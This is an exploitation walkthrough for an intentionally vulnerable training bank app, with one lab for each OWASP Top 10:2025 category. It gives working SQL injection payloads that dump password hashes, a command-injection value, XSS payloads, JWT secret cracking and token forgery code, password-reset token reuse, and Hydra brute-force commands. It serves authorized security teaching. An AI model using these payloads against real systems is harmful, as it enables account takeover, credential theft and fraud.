# Super Insecure Bank v1.0 — Exploitation Walkthrough

> [!WARNING]
> This guide contains full spoilers for the labs.  
> Use it only in local, controlled, and authorized environments.

**Project:** Super Insecure Bank v1.0  
**Application:** intentionally vulnerable banking web application  
**Objective:** practice web hacking and OWASP Top 10:2025  
**Author:** Fernando Conislla

---

## Conventions Used in This Guide

The examples use the following base URL:

```text
http://192.168.1.122:5080
```

Replace `192.168.1.122` with the IP address of the machine where Docker is running.

Initial credentials:

```text
Username: fernando.conislla
Password: password1
```

Several labs require logging in before executing the vulnerable request. Requests are shown in HTTP format so they can be reproduced from the browser, DevTools, an HTTP proxy, or any testing client.

Using **Burp Suite** is recommended to intercept, repeat, and modify HTTP requests during lab exploitation.

---

# A01:2025 — Broken Access Control

## Lab 1 — Access to Another Account’s Information

### Scenario

The application allows bank users to view their accounts and transactions.

Would it be possible to view another user’s transactions, such as Alice’s transactions in account 2002?

---

### Step 1: Query an owned account

When opening the accounts section and querying transactions for an owned account, the application generates a `GET` request to the following resource:

```http
GET http://192.168.1.122:5080/api/accounts/1001/transactions
```

Account `1001` belongs to the authenticated user.

---

### Step 2: Identify the manipulable value

The account identifier is part of the URL:

```text
/api/accounts/1001/transactions
```

The manipulable value is:

```text
1001
```

---

### Step 3: Replace the identifier with Alice’s account

Replace the owned account with account `2002`, associated with Alice:

```http
GET http://192.168.1.122:5080/api/accounts/2002/transactions
```

---

### Expected Result

The application returns information for account `2002`, which belongs to Alice:

```json
{
  "account": {
    "account_number": "2002",
    "account_type": "Checking",
    "balance": "8500.00",
    "currency": "USD",
    "owner_username": "alice.morrison",
    "owner_name": "Alice Morrison"
  }
}
```

---

### Conclusion

The application allows access to information from an account that does not belong to the authenticated user simply by modifying the identifier in the URL.

This demonstrates an access control flaw because the backend does not properly validate that the requested account belongs to the user making the request.

---

## Lab 2 — Hidden Loan Functionality

### Scenario

The loan section indicates that this process must be completed in person.

Would it be possible to request a loan from the application?

---

### Step 1: Access the loan section

Open the following route:

```http
GET http://192.168.1.122:5080/loans
```

The interface indicates that loan requests must be completed in person.

---

### Step 2: Inspect the HTML code

Open DevTools and look for hidden elements related to loans.

A hidden form similar to the following may be found:

```html
<form id="loan-application-form" style="display:none;">
```

---

### Step 3: Display the hidden form

Modify the visual attribute:

```html
style="display:none;"
```

to:

```html
style="display:block;"
```

The form becomes visible in the interface.

---

### Step 4: Submit the request to the backend

The request can be sent directly to the loan endpoint:

```http
POST http://192.168.1.122:5080/api/loans/apply
Content-Type: application/json

{
  "account_id": "1001",
  "amount": "5000",
  "term_months": "24",
  "purpose": "Personal expenses"
}
```

---

### Expected Result

The application accepts the loan request:

```json
{
  "message": "Loan application submitted successfully",
  "loan": {
    "status": "PRE_APPROVED"
  }
}
```

---

### Conclusion

The loan restriction exists only in the interface. Although the form is hidden, the backend still accepts requests.

This demonstrates an access control and authorization flaw because the actual availability of the functionality is not controlled by the server.

---

## Lab 3 — Modification of a Sensitive Profile Field

### Scenario

The application allows the user to modify some profile data.

Would it be possible to modify the phone number used to receive OTP codes?

---

### Step 1: Update normal profile data

When modifying the profile from the application, a request similar to the following is sent:

```http
POST http://192.168.1.122:5080/api/profile/kyc/update
Content-Type: application/json

{
  "address": "Av Principal 1234",
  "occupation": "Consultant",
  "monthly_income": "5000",
  "source_of_funds": "Salary"
}
```

---

### Step 2: Identify that the JSON body can be manipulated

The application processes fields sent by the client inside the request body.

The user can add fields that do not appear in the interface.

---

### Step 3: Add the sensitive `otp_phone` field

Manually add the `otp_phone` field to the request:

```http
POST http://192.168.1.122:5080/api/profile/kyc/update
Content-Type: application/json

{
  "address": "Av Principal 1234",
  "occupation": "Consultant",
  "monthly_income": "5000",
  "source_of_funds": "Salary",
  "otp_phone": "+51 999 888 777"
}
```

---

### Expected Result

The application accepts the additional field and updates the phone number used for OTP.

---

### Conclusion

The application allows modification of a sensitive field that should not be available for direct editing.

This demonstrates a property-level access control flaw because the backend accepts unauthorized attributes sent by the client.

---

# A02:2025 — Security Misconfiguration

## Lab 4 — Exposed Internal Information

### Scenario

The application has a route used to check the system status.

Would it be possible to access internal bank information without logging in?

---

### Step 1: Access the status route

Query the following resource:

```http
GET http://192.168.1.122:5080/status
```

---

### Step 2: Verify whether authentication is required

Open the same route in a private window or without logging in:

```http
GET http://192.168.1.122:5080/status
```

---

### Expected Result

The application returns internal system information:

```json
{
  "hostname": "sib-web-01",
  "environment": "development",
  "debug": true,
  "server": "Werkzeug/2.2.2",
  "python": "3.10.12",
  "warning": "Status endpoint exposed without authentication"
}
```

---

### Conclusion

The application exposes a diagnostic route without authentication.

This provides useful information about the environment, versions, execution mode, and internal components.

---

## Lab 5 — Exposed Diagnostic Console

### Scenario

The application was deployed while keeping a diagnostic screen available.

Would it be possible to find an internal console accessible from the browser?

---

### Step 1: Access the console

Open the following route:

```http
GET http://192.168.1.122:5080/console
```

---

### Step 2: Review the exposed content

The application shows a simulated diagnostic screen:

```text
Werkzeug Debugger Console
Console locked
```

---

### Expected Result

The console is accessible from the browser even though it should be internal functionality.

---

### Conclusion

The application keeps a diagnostic console exposed.

This demonstrates a security misconfiguration because debugging components should not be available in a deployed environment.

---

# A03:2025 — Software Supply Chain Failures

## Lab 6 — Outdated Third-Party Components

### Scenario

The application uses third-party components to operate.

Could it have outdated or vulnerable third-party components?

---

### Step 1: Review HTTP headers

Query an application route and inspect the response headers:

```http
GET http://192.168.1.122:5080/login
```

Look for values related to internal technologies:

```text
Server
Werkzeug
Python
Flask
```

---

### Step 2: Review the status route

Query the status endpoint:

```http
GET http://192.168.1.122:5080/status
```

---

### Expected Result

The application reveals components and versions:

```json
{
  "server": "Werkzeug/2.2.2",
  "python": "3.10.12",
  "debug": true
}
```

---

### Conclusion

The application reveals details about third-party components and versions.

This makes stack fingerprinting easier and enables searching for known vulnerabilities associated with those versions.

---

# A04:2025 — Cryptographic Failures

## Lab 7 — Insecure Password Storage

### Scenario

The application stores user passwords in an internal database.

Would it be possible to recover the original values of those passwords?

---

### Step 1: Extract hashes through a previous vulnerability

Using the SQL Injection from Lab 10, attempt to extract users and hashes from the users table.

Payload:

```sql
%' UNION SELECT 99999, username, username, password_hash, 1, 0, 'USD', email, 'APPROVED', '2026-06-24 00:00' FROM users--
```

The manipulated request conceptually looks like this:

```http
GET http://192.168.1.122:5080/api/accounts/1001/transactions?search=%25%27%20UNION%20SELECT%2099999%2C%20username%2C%20username%2C%20password_hash%2C%201%2C%200%2C%20%27USD%27%2C%20email%2C%20%27APPROVED%27%2C%20%272026-06-24%2000%3A00%27%20FROM%20users--
```

---

### Step 2: Identify MD5 hashes

The extracted hashes look similar to:

```text
7c6a180b36896a0a8c02787eeafb0e4c
```

This format is consistent with a hexadecimal MD5 hash.

---

### Step 3: Save the hashes to a file

Create the file:

```text
hashes.txt
```

Example content:

```text
7c6a180b36896a0a8c02787eeafb0e4c
```

---

### Step 4: Crack the hashes with John

Run:

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

Show the results:

```bash
john hashes.txt --show --format=Raw-MD5
```

---

### Expected Result

John recovers weak passwords stored as MD5 hashes:

```text
password1
qwerty
letmein
football
monkey
dragon
abc123
123456
password
123456789
```

---

### Conclusion

The application stores passwords using a weak and fast hashing algorithm.

This allows original password values to be recovered if the hashes are extracted from the database.

---

## Lab 8 — HTTPS Channel with Weak Configuration

### Scenario

The application provides HTTPS access to protect communication between the user and the bank.

Would it be possible to identify whether the encrypted channel uses weak cryptographic configurations?

---

### Step 1: Access the HTTPS service

Open the application through HTTPS:

```http
GET https://192.168.1.122:5443/login
```

The browser may show a warning because the certificate is self-signed.

---

### Step 2: Analyze the TLS configuration

Run:

```bash
sslscan 192.168.1.122:5443
```

Nmap can also be used:

```bash
nmap -sT --script ssl-enum-ciphers -p 5443 192.168.1.122
```

---

### Expected Result

Weak or non-recommended configurations are identified, for example:

```text
Self-signed certificate
TLSv1.1 enabled
Weak cipher suites
```

---

### Conclusion

Although the application offers HTTPS, the cryptographic configuration can be weak or inadequate.

This shows that using HTTPS is not enough if the channel is not configured securely.

---

## Lab 9 — Weak Secret for Token Generation

### Scenario

The application uses tokens to maintain the authenticated user session.

Would it be possible to create a valid token for another user?

---

### Step 1: Obtain the session JWT

Log in and copy the session cookie value:

```http
POST http://192.168.1.122:5080/api/login
Content-Type: application/json

{
  "username": "fernando.conislla",
  "password": "password1"
}
```

The token is stored in a cookie similar to:

```text
access_token=<JWT>
```

---

### Step 2: Save the JWT to a file

Create the file:

```text
jwt.txt
```

Paste the obtained JWT into the file.

---

### Step 3: Crack the secret with John

Run:

```bash
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```

Show the recovered secret:

```bash
john jwt.txt --show --format=HMAC-SHA256
```

---

### Expected Result

The signing secret is recovered:

```text
trustno1
```

---

### Step 4: Create a token for Alice

Using the recovered secret, generate a JWT for another user:

```bash
python3 - << 'PY'
import jwt

payload = {
    "sub": "alice.morrison",
    "username": "alice.morrison",
    "role": "customer"
}

token = jwt.encode(payload, "trustno1", algorithm="HS256")
print(token)
PY
```

---

### Step 5: Use the forged token

Send an authenticated request using the generated token:

```http
GET http://192.168.1.122:5080/api/accounts
Cookie: access_token=<JWT_FORJADO>
```

---

### Conclusion

The application uses a weak secret to sign JWTs.

Once the secret is recovered, valid tokens can be created for other users, allowing session impersonation.

---

# A05:2025 — Injection

## Lab 10 — SQL Injection in Transaction Search

### Scenario

The application allows users to search for movements within a bank account.

Would it be possible to manipulate the search to obtain more information than expected?

---

### Step 1: Execute a normal search

From the transactions section, perform any search.

The application generates a request similar to:

```http
GET http://192.168.1.122:5080/api/accounts/1001/transactions?search=test
```

---

### Step 2: Identify the manipulable parameter

The vulnerable parameter is:

```text
search
```

---

### Step 3: Test a boolean condition

Modify the parameter with the following payload:

```sql
%' OR 1=1-- 
```

The request becomes:

```http
GET http://192.168.1.122:5080/api/accounts/1001/transactions?search=%25%27%20OR%201%3D1--%20
```

---

### Expected Result

The application returns more records than expected.

---

### Step 4: Enumerate tables

Use a `UNION SELECT` payload against `sqlite_master`:

```sql
%' UNION SELECT 99999, name, name, type, 1, 0, 'USD', sql, 'APPROVED', '2026-06-24 00:00' FROM sqlite_master WHERE type='table'--
```

---

### Step 5: Extract users and hashes

Use a payload against the `users` table:

```sql
%' UNION SELECT 99999, username, username, password_hash, 1, 0, 'USD', email, 'APPROVED', '2026-06-24 00:00' FROM users--
```

---

### Conclusion

The application concatenates user-controlled data inside an SQL query.

This allows the query logic to be modified and information outside the intended functional scope to be extracted.

---

## Lab 11 — Command Injection in Account Statements

### Scenario

The application allows users to view their account statements.

Would it be possible to manipulate this functionality to execute commands on the server?

---

### Step 1: Open the account statements section

Go to:

```http
GET http://192.168.1.122:5080/statements
```

---

### Step 2: Load statements normally

Click the button:

```text
Load statements
```

The application generates a request similar to:

```http
GET http://192.168.1.122:5080/api/statements/accounts/1001
```

---

### Step 3: Modify the button’s HTML attribute

From DevTools, locate the button containing the account identifier:

```html
<button class="btn primary load-statements" data-account="1001" onclick="loadStatementsFor(this)">
  Load statements
</button>
```

Change:

```html
data-account="1001"
```

to:

```html
data-account="1001;whoami"
```

---

### Step 4: Execute the functionality again

Click again on:

```text
Load statements
```

The application generates the manipulated request:

```http
GET http://192.168.1.122:5080/api/statements/accounts/1001;whoami
```

---

### Expected Result

The interface shows anomalous output:

```text
Command output
root
```

or:

```text
Command output
www-data
```

---

### Conclusion

The application uses a user-controlled value inside an operation executed at the operating system level.

This allows operating system commands to be injected through an apparently legitimate business function.

---

## Lab 12 — Cross-Site Scripting in Receipts

### Scenario

The application allows users to write a note or reference when making a transfer.

Would it be possible to contaminate this field to execute arbitrary JavaScript code when the receipt is viewed?

---

### Step 1: Create a normal transfer

From the transfer functionality, send money to another account.

The application processes a request similar to:

```http
POST http://192.168.1.122:5080/api/transfers/create
Content-Type: application/json

{
  "from_account": "1001",
  "to_account": "2002",
  "amount": "1.00",
  "note": "Dinner reimbursement"
}
```

---

### Step 2: Identify the manipulable field

The field used as a note or reference is:

```text
note
```

---

### Step 3: Send an XSS payload

Modify the note with the following payload:

```html
<img src=x onerror=alert(1)>
```

The request becomes:

```http
POST http://192.168.1.122:5080/api/transfers/create
Content-Type: application/json

{
  "from_account": "1001",
  "to_account": "2002",
  "amount": "1.00",
  "note": "<img src=x onerror=alert(1)>"
}
```

Alternative payload:

```html
<script>alert(1)</script>
```

---

### Step 4: View the generated receipt

Open the receipt associated with the transfer from the interface.

---

### Expected Result

The browser executes JavaScript when rendering the receipt:

```javascript
alert(1)
```

---

### Conclusion

The application reflects or stores user-controlled content without properly encoding it when displaying the receipt.

This allows JavaScript execution in the browser of whoever views the receipt.

---

# A06:2025 — Insecure Design

## Lab 13 — Inadequate Design in Commission Charging

### Scenario

The application charges a commission for external transfers.

Would it be possible to avoid the commission charge when executing an external transfer?

---

### Step 1: Perform a small external transfer

Send an external transfer with a very small amount:

```http
POST http://192.168.1.122:5080/api/transfers/create
Content-Type: application/json

{
  "from_account": "1001",
  "to_account": "3003",
  "amount": "0.49",
  "note": "microtransfer test"
}
```

---

### Step 2: Review the calculated commission

Observe the application response.

---

### Expected Result

The commission is calculated as zero:

```json
{
  "transfer": {
    "amount": "0.49",
    "fee": "0.00",
    "total_debit": "0.49"
  }
}
```

---

### Step 3: Repeat the pattern

Repeat several small transfers to observe that the commission rule can be bypassed through transaction splitting.

---

### Conclusion

The business rule for commissions was designed insufficiently.

Although a percentage-based commission exists, rounding allows the fee to be avoided through microtransfers.

---

# A07:2025 — Authentication Failures

## Lab 14 — User Enumeration

### Scenario

The application allows interaction with different flows where usernames are processed.

Would it be possible to discover and validate valid usernames in the application?

---

### Step 1: Review public information

Open the social section:

```http
GET http://192.168.1.122:5080/social
```

Identify names published by the application:

```text
Fernando Conislla
Alice Morrison
Bob Wilson
Carla Bennett
Daniel Brooks
```

---

### Step 2: Infer the username format

Convert the names to the format used by the application:

```text
firstname.lastname
```

Examples:

```text
fernando.conislla
alice.morrison
bob.wilson
carla.bennett
daniel.brooks
```

---

### Step 3: Validate users through forgot password

Send a request with an existing user:

```http
POST http://192.168.1.122:5080/api/forgot-password
Content-Type: application/json

{
  "username": "alice.morrison"
}
```

Send another request with a nonexistent user:

```http
POST http://192.168.1.122:5080/api/forgot-password
Content-Type: application/json

{
  "username": "no.user"
}
```

---

### Expected Result

The nonexistent user returns a different response:

```json
{
  "error": "No account was found with that username."
}
```

---

### Conclusion

The application allows distinguishing between existing and nonexistent users.

This makes it easier to build a list of valid users for later brute-force, phishing, or password reset abuse attacks.

---

## Lab 15 — Insecure Password Reset

### Scenario

The application allows password resets through a reset link sent to the user’s email.

Would it be possible to change another user’s password, for example Alice’s?

---

### Step 1: Request a reset for Fernando

Send a reset request for the owned user:

```http
POST http://192.168.1.122:5080/api/forgot-password
Content-Type: application/json

{
  "username": "fernando.conislla"
}
```

---

### Step 2: Open the simulated mailbox

Query the user mailbox:

```http
GET http://192.168.1.122:5080/mailbox?username=fernando.conislla
```

Copy the reset token received.

---

### Step 3: Observe the confirmation request

The legitimate request to change the owned user’s password would be:

```http
POST http://192.168.1.122:5080/api/reset-password/confirm
Content-Type: application/json

{
  "token": "<RESET_TOKEN_DE_FERNANDO>",
  "username": "fernando.conislla",
  "new_password": "password2"
}
```

---

### Step 4: Change the target user to Alice

Modify the `username` field and keep the same token:

```http
POST http://192.168.1.122:5080/api/reset-password/confirm
Content-Type: application/json

{
  "token": "<RESET_TOKEN_DE_FERNANDO>",
  "username": "alice.morrison",
  "new_password": "AliceNew123"
}
```

---

### Step 5: Log in as Alice

Test the new credentials:

```http
POST http://192.168.1.122:5080/api/login
Content-Type: application/json

{
  "username": "alice.morrison",
  "password": "AliceNew123"
}
```

---

### Expected Result

The application allows logging in as Alice using the new password.

---

### Conclusion

The reset token is not properly bound to the user for whom it was issued.

This allows a valid token from one user to be used to change another user’s password.

---

## Lab 16 — Login with Insufficient Defense and Weak Passwords

### Scenario

The login form allows different username and password combinations to be attempted.

Would it be possible to identify valid passwords for the application users?

---

### Step 1: Identify the login endpoint

The form sends credentials to the following resource:

```http
POST http://192.168.1.122:5080/api/login
Content-Type: application/json

{
  "username": "fernando.conislla",
  "password": "password1"
}
```

---

### Step 2: Observe the difference between success and failure

The application responds with HTTP `200` for both valid and invalid credentials.

The difference is in the response body:

```text
Success: Login successful
Failure: Invalid username or password
```

---

### Step 3: Create a user list

Example:

```text
fernando.conislla
alice.morrison
bob.wilson
carla.bennett
daniel.brooks
alonso.conislla
emily.carter
james.howard
olivia.martin
william.scott
```

Save it as:

```text
users.txt
```

---

### Step 4: Run Hydra against HTTP

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.122 -s 5080 http-post-form '/api/login:{"username"\\:"^USER^","password"\\:"^PASS^"}:S=Login successful:H=Content-Type\\: application/json' -V -I
```

---

### Step 5: Run Hydra against HTTPS

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.122 -s 5443 https-post-form '/api/login:{"username"\\:"^USER^","password"\\:"^PASS^"}:S=Login successful:H=Content-Type\\: application/json' -V -I
```

---

### Expected Result

Hydra identifies valid credentials:

```text
alice.morrison:qwerty
bob.wilson:letmein
carla.bennett:football
daniel.brooks:monkey
```

---

### Conclusion

The login allows automated attacks against multiple usernames and passwords.

This demonstrates the absence of effective brute-force protections, along with the use of weak passwords.

---

# A08:2025 — Software or Data Integrity Failures

## Lab 17 — Receipt with Manipulated Data

### Scenario

The application generates a receipt after a transfer is made.

Would it be possible to generate receipts that are inconsistent with the real transactions?

---

### Step 1: Perform a real transfer

Send a low-value transfer:

```http
POST http://192.168.1.122:5080/api/transfers/create
Content-Type: application/json

{
  "from_account": "1001",
  "to_account": "2002",
  "amount": "1.00",
  "note": "integrity test"
}
```

Copy the transfer identifier returned by the application.

---

### Step 2: Generate a legitimate receipt

The application generates the receipt using data sent by the client:

```http
POST http://192.168.1.122:5080/api/receipts/generate
Content-Type: application/json

{
  "transfer_id": "T9248",
  "from_account": "1001",
  "to_account": "2002",
  "amount": "1.00",
  "currency": "USD",
  "status": "APPROVED",
  "payment_reference": "integrity test"
}
```

---

### Step 3: Manipulate the receipt amount

Change the amount sent to the receipt generator:

```http
POST http://192.168.1.122:5080/api/receipts/generate
Content-Type: application/json

{
  "transfer_id": "T9248",
  "from_account": "1001",
  "to_account": "2002",
  "amount": "9999.00",
  "currency": "USD",
  "status": "APPROVED",
  "payment_reference": "integrity test"
}
```

---

### Expected Result

The receipt shows an amount different from the actual transaction:

```text
Real transferred amount: 1.00 USD
Amount shown in receipt: 9999.00 USD
```

---

### Conclusion

The application generates receipts by trusting data sent by the client.

This allows creating receipts that are inconsistent with the operation actually recorded.

---

# A09:2025 — Security Logging and Alerting Failures

## Lab 18 — Security Logs Exposing Too Much Information

### Scenario

The application records events related to authentication and suspicious activity.

Would it be possible to identify excessive or sensitive information stored in the logs?

---

### Step 1: Generate authentication events

Execute a failed login attempt:

```http
POST http://192.168.1.122:5080/api/login
Content-Type: application/json

{
  "username": "alice.morrison",
  "password": "wrongpass"
}
```

Then perform a successful login:

```http
POST http://192.168.1.122:5080/api/login
Content-Type: application/json

{
  "username": "fernando.conislla",
  "password": "password1"
}
```

---

### Step 2: Query the security logs

Open the security dashboard:

```http
GET http://192.168.1.122:5080/security-dashboard
```

The logs endpoint can also be queried:

```http
GET http://192.168.1.122:5080/api/security-logs
```

---

### Expected Result

The logs show excessive or sensitive information:

```text
LOGIN_FAILED user=alice.morrison password=wrongpass
LOGIN_SUCCESS user=fernando.conislla jwt=<JWT_COMPLETO>
```

---

### Step 3: Identify additional dangerous actions

The application allows logs to be cleared from an endpoint:

```http
POST http://192.168.1.122:5080/api/security-logs/clear
```

---

### Conclusion

The application logs sensitive information such as passwords or tokens.

In addition, the ability to clear logs affects traceability and reduces the ability to investigate later.

---

# A10:2025 — Mishandling of Exceptional Conditions

## Lab 19 — Inadequate Error Handling in Transaction Queries

### Scenario

The application receives account identifiers to query transactions.

Would it be possible to trigger an error that reveals internal system details?

---

### Step 1: Query transactions with a valid identifier

The application normally queries transactions with a numeric identifier:

```http
GET http://192.168.1.122:5080/api/accounts/1001/transactions
```

---

### Step 2: Send an invalid identifier

Replace the numeric identifier with text:

```http
GET http://192.168.1.122:5080/api/accounts/abc/transactions
```

---

### Expected Result

The application returns a technical error with internal details:

```json
{
  "error": "Invalid account identifier",
  "stacktrace": "...",
  "query": "...",
  "database": "sqlite:///..."
}
```

---

### Conclusion

The application does not properly handle exceptional conditions generated by invalid input.

This causes exposure of stack traces, queries, internal paths, or implementation details that can support later attacks.

---

# Closing

This walkthrough demonstrates how the 19 Super Insecure Bank v1.0 labs can be exploited in a practical and reproducible way.

The goal of this guide is to support technical learning of OWASP Top 10:2025 through realistic scenarios inside a vulnerable banking application.
